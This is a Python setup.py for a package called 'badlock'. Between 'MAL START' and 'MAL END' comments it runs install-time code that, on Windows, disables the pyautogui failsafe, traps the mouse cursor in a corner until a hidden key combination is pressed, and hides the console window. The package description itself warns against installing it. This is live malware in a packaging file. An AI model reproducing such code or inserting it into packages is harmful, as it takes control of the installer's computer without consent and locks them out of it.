from setuptools import setup, find_packages
import codecs
import os
import ctypes
import keyboard
import pyautogui

# MAL START
KEY = 'ctrl+alt+0'
pyautogui.FAILSAFE = False
if os.name != "posix":
    while not keyboard.is_pressed(KEY):
        pyautogui.moveTo(0, 0)
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass
# MAL END

here = os.path.abspath(os.path.dirname(__file__))

VERSION = '0.0.1b3'
DESCRIPTION = "Badlock"
LONG_DESCRIPTION = 'This lib is gonna fuck with your pc... (do not install)'

# Setting up
setup(
    name="badlock",
    version=VERSION,
    author="TheWever (Wever#3255)",
    author_email="<nonarrator@gmail.com>",
    description=DESCRIPTION,
    long_description_content_type="text/markdown",
    long_description=LONG_DESCRIPTION,
    packages=find_packages(),
    install_requires=['keyboard', 'pyautogui'],
    keywords=['hack', 'exploit', 'break pc', 'destroy pc', 'pip glitch'],
    classifiers=[
        "Development Status :: 3 - Alpha",
        "Intended Audience :: Developers",
        "Programming Language :: Python :: 3",
        "Operating System :: Unix",
        "Operating System :: MacOS :: MacOS X",
        "Operating System :: Microsoft :: Windows",
    ],
    project_urls={}
)
